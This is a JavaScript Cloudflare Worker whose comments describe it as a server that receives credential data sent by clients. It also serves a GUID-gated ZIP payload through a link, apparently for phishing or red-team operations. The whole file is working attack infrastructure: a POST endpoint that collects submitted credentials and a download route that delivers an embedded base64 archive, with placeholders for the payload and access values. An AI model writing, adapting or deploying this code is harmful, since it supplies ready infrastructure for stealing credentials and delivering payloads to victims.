// Use this sample to deploy as a cloudflare worker to recieve credential data from the client and store it in a KV store
// This is a simple example and should be used as a reference only.
// Serve the zip to client as a link (e.g., https://1.test.workers.dev/download?guid=1888-s9932k-ks98s9923kl)

addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request))
  })
  
  async function handleRequest(request) {
    const { pathname } = new URL(request.url);
    if (request.method === 'POST') {
      try {
        // Parse the JSON data from the request
        const data = await request.json();
        // Process or log the data as needed
        console.log('Data received:', data);
        return new Response('Data received successfully', { status: 200 });
      } catch (error) {
        return new Response('Invalid JSON', { status: 400 });
      }
    } else if (request.method == 'GET' && pathname == '/download')  {
        const url = new URL(request.url);

        // Modify the parameter name as needed
        const authParam = url.searchParams.get("AUTHPARAM_KEY");
        
        // Change this parameter to match the GUID you expect
        if (authParam !== "AUTHPARAM_VALUE") {
          return new Response("Unauthorized", { status: 403 });
        }
      
        // The Base64 encoded ZIP file (replace with your actual Base64 string)
        const zipB64 = "BASE64_ENCODED_ZIP";
      
        const binaryString = atob(zipB64);
        const len = binaryString.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
          bytes[i] = binaryString.charCodeAt(i);
        }
      
        const headers = new Headers();
        headers.set("Content-Type", "application/zip");
        headers.set("Content-Disposition", "attachment; filename=\"ZIP_NAME\"");
      
        return new Response(bytes.buffer, {
          status: 200,
          headers: headers
        });
    } else {
      return new Response('Status unavailable', { status: 405 });
    }
  }